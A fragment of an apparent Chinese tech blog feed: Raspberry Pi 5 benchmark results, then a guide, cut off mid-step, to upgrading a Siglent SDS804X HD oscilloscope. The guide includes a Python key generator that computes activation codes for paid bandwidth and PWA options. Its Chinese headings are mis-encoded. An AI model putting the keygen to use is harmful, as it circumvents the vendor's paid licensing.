    <content type="html"><![CDATA[<p>CPU:BCM2835<br>RAM:4G  </p><p>screenfetch  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                         ./+o+-       disappear9@Pi5</span><br><span class="line">                 yyyyy- -yyyyyy+      OS: Ubuntu 24.04 noble</span><br><span class="line">              ://+//////-yyyyyyo      Kernel: aarch64 Linux 6.8.0-1020-raspi</span><br><span class="line">          .++ .:/++++++/-.+sss/`      Uptime: 32m</span><br><span class="line">        .:++o:  /++++++++/:--:/-      Packages: 2548</span><br><span class="line">       o:+o+:++.`..```.-/oo+++++/     Shell: bash 5.2.21</span><br><span class="line">      .:+o:+o/.          `+sssoo+/    Resolution: 4480x1440</span><br><span class="line"> .++/+:+oo+o:`             /sssooo.   WM: Not Found</span><br><span class="line">/+++//+:`oo+o               /::--:.   GTK Theme: Adwaita [GTK3]</span><br><span class="line">\+/+o+++`o++o               ++////.   Disk: 7.9G / 57G (15%)</span><br><span class="line"> .++.o+++oo+:`             /dddhhh.   CPU: ARM Cortex-A76 @ 4x 2.4GHz</span><br><span class="line">      .+.o+oo:.          `oddhhhh+    RAM: 470MiB / 3984MiB</span><br><span class="line">       \+.++o+o``-````.:ohdhhhhh+</span><br><span class="line">        `:o+++ `ohhhhhhhhyo++os:</span><br><span class="line">          .o:`.syhhhhhhh/.oo++o`</span><br><span class="line">              /osyyyyyyo++ooo+++/</span><br><span class="line">                  ````` +oo+++o\:</span><br><span class="line">                         `oo++.</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>7-zip 23.01:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Pi5:~$ 7z b -mmt4</span><br><span class="line"></span><br><span class="line">7-Zip 23.01 (arm64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20</span><br><span class="line"> 64-bit arm_v:8 locale=C.UTF-8 Threads:4 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line"> mt4</span><br><span class="line">Compiler: 13.2.0 GCC 13.2.0</span><br><span class="line">Linux : 6.8.0-1020-raspi : #24-Ubuntu SMP PREEMPT_DYNAMIC Sun Feb 23 08:39:32 UTC 2025 : aarch64</span><br><span class="line">PageSize:4KB THP:madvise hwcap:119FFF:CRC32:SHA1:SHA2:AES:ASIMD</span><br><span class="line">LE</span><br><span class="line"></span><br><span class="line">1T CPU Freq (MHz):  2130  2394  2394  2394  2394  2394  2394</span><br><span class="line">2T CPU Freq (MHz): 200% 2382   200% 2394</span><br><span class="line"></span><br><span class="line">RAM size:    3984 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    889 MB,  # Benchmark threads:      4</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:      10993   374   2857  10695  |     160334   396   3455  13679</span><br><span class="line">23:      10165   380   2727  10358  |     157739   399   3422  13649</span><br><span class="line">24:       9693   382   2727  10422  |     154513   399   3402  13560</span><br><span class="line">25:       9088   381   2725  10377  |     150242   399   3349  13371</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:      9985   379   2759  10463  |     155707   398   3407  13565</span><br><span class="line">Tot:             389   3083  12014</span><br><span class="line">disappear9@Pi5:~$ 7z b -mmt1</span><br><span class="line"></span><br><span class="line">7-Zip 23.01 (arm64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20</span><br><span class="line"> 64-bit arm_v:8 locale=C.UTF-8 Threads:4 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line"> mt1</span><br><span class="line">Compiler: 13.2.0 GCC 13.2.0</span><br><span class="line">Linux : 6.8.0-1020-raspi : #24-Ubuntu SMP PREEMPT_DYNAMIC Sun Feb 23 08:39:32 UTC 2025 : aarch64</span><br><span class="line">PageSize:4KB THP:madvise hwcap:119FFF:CRC32:SHA1:SHA2:AES:ASIMD</span><br><span class="line">LE</span><br><span class="line"></span><br><span class="line">1T CPU Freq (MHz):  1490  1495  2134  2394  2394  2394  2394</span><br><span class="line"></span><br><span class="line">RAM size:    3984 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    437 MB,  # Benchmark threads:      1</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:       3509   100   3420   3414  |      42244   100   3604   3607</span><br><span class="line">23:       3261   100   3325   3323  |      41559   100   3603   3597</span><br><span class="line">24:       3136   100   3381   3373  |      40745   100   3577   3577</span><br><span class="line">25:       3010   100   3442   3437  |      39720   100   3529   3535</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:      3229   100   3392   3387  |      41067   100   3579   3579</span><br><span class="line">Tot:             100   3485   3483</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>phoronix-test-suite benchmark compress-7zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Pi5:~/phoronix-test-suite$ ./phoronix-test-suite benchmark compress-7zip</span><br><span class="line"></span><br><span class="line">Phoronix Test Suite v10.8.4</span><br><span class="line"></span><br><span class="line">    To Install:    pts/compress-7zip-1.11.0</span><br><span class="line"></span><br><span class="line">    pts/compress-7zip-1.11.0:</span><br><span class="line">        Test Installation 1 of 1</span><br><span class="line">        1 File Needed [1.42 MB]</span><br><span class="line">        Downloading: 7z2405-src.tar.xz</span><br><span class="line"></span><br><span class="line">System Information</span><br><span class="line"></span><br><span class="line">  PROCESSOR:              ARMv8 Cortex-A76 @ 2.40GHz</span><br><span class="line">    Core Count:           4</span><br><span class="line">    Scaling Driver:       cpufreq-dt ondemand</span><br><span class="line"></span><br><span class="line">  GRAPHICS:</span><br><span class="line">    Screen:               4480x1440</span><br><span class="line"></span><br><span class="line">  MOTHERBOARD:            Raspberry Pi 5 Model B Rev 1.0</span><br><span class="line">    Chipset:              Broadcom BCM2712</span><br><span class="line">    Network:              Raspberry Pi RP1 PCIe 2.0 South Bridge</span><br><span class="line"></span><br><span class="line">  MEMORY:                 4096MB</span><br><span class="line"></span><br><span class="line">  DISK:                   62GB SA64G</span><br><span class="line">    File-System:          ext4</span><br><span class="line">    Mount Options:        relatime rw</span><br><span class="line">    Disk Details:         Block Size: 4096</span><br><span class="line"></span><br><span class="line">  OPERATING SYSTEM:       Ubuntu 24.04</span><br><span class="line">    Kernel:               6.8.0-1020-raspi (aarch64)</span><br><span class="line">    Display Server:       X Server</span><br><span class="line">    Compiler:             GCC 13.3.0</span><br><span class="line">    Security:             gather_data_sampling: Not affected</span><br><span class="line">                          + itlb_multihit: Not affected</span><br><span class="line">                          + l1tf: Not affected</span><br><span class="line">                          + mds: Not affected</span><br><span class="line">                          + meltdown: Not affected</span><br><span class="line">                          + mmio_stale_data: Not affected</span><br><span class="line">                          + reg_file_data_sampling: Not affected</span><br><span class="line">                          + retbleed: Not affected</span><br><span class="line">                          + spec_rstack_overflow: Not affected</span><br><span class="line">                          + spec_store_bypass: Mitigation of SSB disabled via prctl</span><br><span class="line">                          + spectre_v1: Mitigation of __user pointer sanitization</span><br><span class="line">                          + spectre_v2: Mitigation of CSV2 BHB</span><br><span class="line">                          + srbds: Not affected</span><br><span class="line">                          + tsx_async_abort: Not affected</span><br><span class="line"></span><br><span class="line">7-Zip Compression 24.05:</span><br><span class="line">    pts/compress-7zip-1.11.0</span><br><span class="line">    Test 1 of 1</span><br><span class="line">    Estimated Trial Run Count:    3</span><br><span class="line">    Estimated Time To Completion: 17 Minutes [07:36 UTC]</span><br><span class="line">        Started Run 1 @ 07:20:28</span><br><span class="line">        Started Run 2 @ 07:21:09</span><br><span class="line">        Started Run 3 @ 07:21:50</span><br><span class="line"></span><br><span class="line">    Test: Compression Rating:</span><br><span class="line">        10584</span><br><span class="line">        10772</span><br><span class="line">        10731</span><br><span class="line"></span><br><span class="line">    Average: 10696 MIPS</span><br><span class="line">    Deviation: 0.92%</span><br><span class="line"></span><br><span class="line">    Test: Decompression Rating:</span><br><span class="line">        13478</span><br><span class="line">        13524</span><br><span class="line">        13528</span><br><span class="line"></span><br><span class="line">    Average: 13510 MIPS</span><br><span class="line">    Deviation: 0.21%</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sysbench  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Pi5:~$ sysbench cpu --cpu-max-prime=20000 --threads=4 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 4</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:  4128.44</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0010s</span><br><span class="line">    total number of events:              41295</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    0.96</span><br><span class="line">         avg:                                    0.97</span><br><span class="line">         max:                                   10.02</span><br><span class="line">         95th percentile:                        0.97</span><br><span class="line">         sum:                                39994.74</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           10323.7500/20.90</span><br><span class="line">    execution time (avg/stddev):   9.9987/0.00</span><br><span class="line"></span><br><span class="line">disappear9@Pi5:~$ sysbench cpu --cpu-max-prime=20000 --threads=1 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:  1033.96</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0007s</span><br><span class="line">    total number of events:              10342</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    0.96</span><br><span class="line">         avg:                                    0.97</span><br><span class="line">         max:                                    1.51</span><br><span class="line">         95th percentile:                        0.97</span><br><span class="line">         sum:                                 9998.56</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           10342.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   9.9986/0.00</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CPU:BCM2835&lt;br&gt;RAM:4G  &lt;/p&gt;
&lt;p&gt;screenfetch  &lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;                         ./+o+-       disappear9@Pi5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 yyyyy- -yyyyyy+      OS: Ubuntu 24.04 noble&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              ://+//////-yyyyyyo      Kernel: aarch64 Linux 6.8.0-1020-raspi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          .++ .:/++++++/-.+sss/`      Uptime: 32m&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        .:++o:  /++++++++/:--:/-      Packages: 2548&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       o:+o+:++.`..```.-/oo+++++/     Shell: bash 5.2.21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      .:+o:+o/.          `+sssoo+/    Resolution: 4480x1440&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; .++/+:+oo+o:`             /sssooo.   WM: Not Found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/+++//+:`oo+o               /::--:.   GTK Theme: Adwaita [GTK3]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&#92;+/+o+++`o++o               ++////.   Disk: 7.9G / 57G (15%)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; .++.o+++oo+:`             /dddhhh.   CPU: ARM Cortex-A76 @ 4x 2.4GHz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      .+.o+oo:.          `oddhhhh+    RAM: 470MiB / 3984MiB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &#92;+.++o+o``-````.:ohdhhhhh+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        `:o+++ `ohhhhhhhhyo++os:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          .o:`.syhhhhhhh/.oo++o`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              /osyyyyyyo++ooo+++/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  ````` +oo+++o&#92;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                         `oo++.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/categories/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/tags/%E6%9D%82%E9%A1%B9/"/>
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/tags/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>é¼é˜³ SDS804X HD ç¤ºæ³¢å™¨å¸¦å®½ä¸é€‰ä»¶å‡çº§</title>
    <link href="https://thinkalone.win/SDS804X-HD-Upgrade.html"/>
    <id>https://thinkalone.win/SDS804X-HD-Upgrade.html</id>
    <published>2025-03-01T04:00:00.000Z</published>
    <updated>2025-03-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å®Œæˆæ•ˆæœ"><a href="#å®Œæˆæ•ˆæœ" class="headerlink" title="å®Œæˆæ•ˆæœ"></a>å®Œæˆæ•ˆæœ</h2><p>è„šæœ¬æ¥æºï¼š <a href="https://www.eevblog.com/forum/testgear/siglent-sds-sdg-hack-script/">https://www.eevblog.com/forum/testgear/siglent-sds-sdg-hack-script/</a><br>å‡çº§å®Œæˆåå‹å·ä¼šæ˜¾ç¤ºä¸ºSDS824X HDï¼š  </p><p><img src="/pictures/SDS804X-HD-Upgrade/1.png">  </p><hr><span id="more"></span> <h2 id="æ“ä½œæ­¥éª¤"><a href="#æ“ä½œæ­¥éª¤" class="headerlink" title="æ“ä½œæ­¥éª¤"></a>æ“ä½œæ­¥éª¤</h2><h3 id="1-ç¤ºæ³¢å™¨è¿å¥½ç½‘çº¿ï¼Œé…ç½®ç½‘ç»œï¼š"><a href="#1-ç¤ºæ³¢å™¨è¿å¥½ç½‘çº¿ï¼Œé…ç½®ç½‘ç»œï¼š" class="headerlink" title="1.ç¤ºæ³¢å™¨è¿å¥½ç½‘çº¿ï¼Œé…ç½®ç½‘ç»œï¼š"></a>1.ç¤ºæ³¢å™¨è¿å¥½ç½‘çº¿ï¼Œé…ç½®ç½‘ç»œï¼š</h3><p><img src="/pictures/SDS804X-HD-Upgrade/2.png"><br><img src="/pictures/SDS804X-HD-Upgrade/3.png"><br><img src="/pictures/SDS804X-HD-Upgrade/4.png">  </p><p>é…ç½‘åçš„æ“ä½œå°±å¯ä»¥ä¸ç”¨åœ¨ç¤ºæ³¢å™¨çš„å°å±å¹•ä¸Šè¿›è¡Œäº†ã€‚  </p><h3 id="2-æ‰“å¼€SCPIé¡µé¢"><a href="#2-æ‰“å¼€SCPIé¡µé¢" class="headerlink" title="2.æ‰“å¼€SCPIé¡µé¢"></a>2.æ‰“å¼€SCPIé¡µé¢</h3><p><img src="/pictures/SDS804X-HD-Upgrade/5.png">  </p><h3 id="3-ä¿®æ”¹å¹¶è¿è¡Œè„šæœ¬"><a href="#3-ä¿®æ”¹å¹¶è¿è¡Œè„šæœ¬" class="headerlink" title="3.ä¿®æ”¹å¹¶è¿è¡Œè„šæœ¬"></a>3.ä¿®æ”¹å¹¶è¿è¡Œè„šæœ¬</h3><figure class="highlight python"><figcaption><span>Python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># SCPIé¡µé¢è¿è¡Œå‘½ä»¤ MD5_SRLN? è·å¾—SCOPEID</span></span><br><span class="line">SCOPEID = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ Home é¡µé¢æ‰¾åˆ°SNè¿›è¡Œæ›¿æ¢</span></span><br><span class="line">SN = <span class="string">&#x27;SDS00000000000&#x27;</span></span><br><span class="line">Model = <span class="string">&#x27;SDS800X-HD&#x27;</span></span><br><span class="line"></span><br><span class="line">bwopt = (<span class="string">&#x27;70M&#x27;</span>, <span class="string">&#x27;100M&#x27;</span>, <span class="string">&#x27;200M&#x27;</span>)</span><br><span class="line">otheropt = (<span class="string">&#x27;PWA&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">hashkey = <span class="string">&#x27;5zao9lyua01pp7hjzm3orcq90mds63z6zi5kv7vmv3ih981vlwn06txnjdtas3u2wa8msx61i12ueh14t7kqwsfskg032nhyuy1d9vv2wm925rd18kih9xhkyilobbgy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">x</span>):</span><br><span class="line">    h = hashlib.md5((</span><br><span class="line">        hashkey +</span><br><span class="line">        (Model+<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">32</span>, <span class="string">&#x27;\x00&#x27;</span>) +</span><br><span class="line">        opt.ljust(<span class="number">5</span>, <span class="string">&#x27;\x00&#x27;</span>) +</span><br><span class="line">        <span class="number">2</span>*(((SCOPEID <span class="keyword">if</span> opt <span class="keyword">in</span> bwopt <span class="keyword">else</span> SN) + <span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">32</span>, <span class="string">&#x27;\x00&#x27;</span>)) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">16</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    ).digest()</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> h:</span><br><span class="line">        <span class="keyword">if</span> (b &lt;= <span class="number">0x2F</span> <span class="keyword">or</span> b &gt; <span class="number">0x39</span>) <span class="keyword">and</span> (b &lt;= <span class="number">0x60</span> <span class="keyword">or</span> b &gt; <span class="number">0x7A</span>):</span><br><span class="line">            m = b % <span class="number">0x24</span></span><br><span class="line">            b = m + (<span class="number">0x57</span> <span class="keyword">if</span> m &gt; <span class="number">9</span> <span class="keyword">else</span> <span class="number">0x30</span>)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0x30</span>:</span><br><span class="line">            b = <span class="number">0x32</span></span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0x31</span>:</span><br><span class="line">            b = <span class="number">0x33</span></span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0x6c</span>:</span><br><span class="line">            b = <span class="number">0x6d</span></span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0x6f</span>:</span><br><span class="line">            b = <span class="number">0x70</span></span><br><span class="line">        key += <span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="keyword">return</span> key.upper()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> opt <span class="keyword">in</span> bwopt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;:5&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(opt, gen(SCOPEID)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;--------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> opt <span class="keyword">in</span> otheropt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;:5&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(opt, gen(SN)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-å‡çº§å¸¦å®½"><a href="#4-å‡çº§å¸¦å®½" class="headerlink" title="4.å‡çº§å¸¦å®½"></a>4.å‡çº§å¸¦å®½</h3><p>æ³¨ï¼šåœ¨å‘SCPIé¡µé¢è¾“å…¥ä»»ä½•è„šæœ¬ç”Ÿæˆçš„æ¿€æ´»ç å‰ï¼Œå…ˆè¿è¡Œå‘½ä»¤<code>MCBD?</code>æŸ¥è¯¢å½“å…ˆå¸¦å®½çš„æ¿€æ´»ç ï¼ˆä¸€èˆ¬ä¸º70Mçš„ï¼‰ï¼Œæ ¸å¯¹ä¸è„šæœ¬ç”Ÿæˆçš„70Mçš„æ¿€æ´»ç 